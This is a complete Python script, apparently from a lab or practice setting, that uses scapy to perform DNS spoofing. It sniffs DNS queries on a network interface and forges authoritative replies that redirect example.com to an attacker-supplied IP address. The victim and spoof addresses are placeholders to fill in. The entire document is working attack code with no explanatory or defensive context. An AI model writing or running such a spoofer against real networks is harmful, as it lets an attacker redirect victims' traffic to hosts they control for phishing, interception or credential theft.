#!/usr/bin/env python3
from scapy.all import *

VICTIM_IP = "write your own victim ip here"
SPOOF_IP = "write your own spoof ip here"  
INTERFACE = "wlo1"        

def spoof(pkt):
    print(f"[*] Captured packet from {pkt[IP].src} to {pkt[IP].dst}")

    if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
        return
    
    dns_layer = pkt[DNS]
    
    if dns_layer.qr != 0:
        return
        
    qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
    qtype = pkt[DNSQR].qtype
    
    if qtype == 1 and qname == "example.com":
        print(f"[+] Spoofing {qname} -> {SPOOF_IP}")
        
        dns_resp = DNS(
            id=dns_layer.id,          
            qr=1,                     
            aa=1,                    
            rd=dns_layer.rd,          
            ra=1,                     
            rcode=0,                  
            qd=pkt[DNSQR],            
            an=DNSRR(rrname=qname + ".", ttl=10, rdata=SPOOF_IP),
            ancount=1
        )
        
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_layer = UDP(sport=53, dport=pkt[UDP].sport)
        
        eth_layer = Ether(dst=pkt[Ether].src)
        
        sendp(eth_layer / ip_layer / udp_layer / dns_resp, iface=INTERFACE, verbose=False)
        print("    [+] Reply sent successfully.")

print(f"[*] Sniffing for DNS queries on {INTERFACE}...")
print("[*] Press Ctrl+C to stop.")
sniff(iface=INTERFACE, filter="udp port 53", prn=spoof, store=0)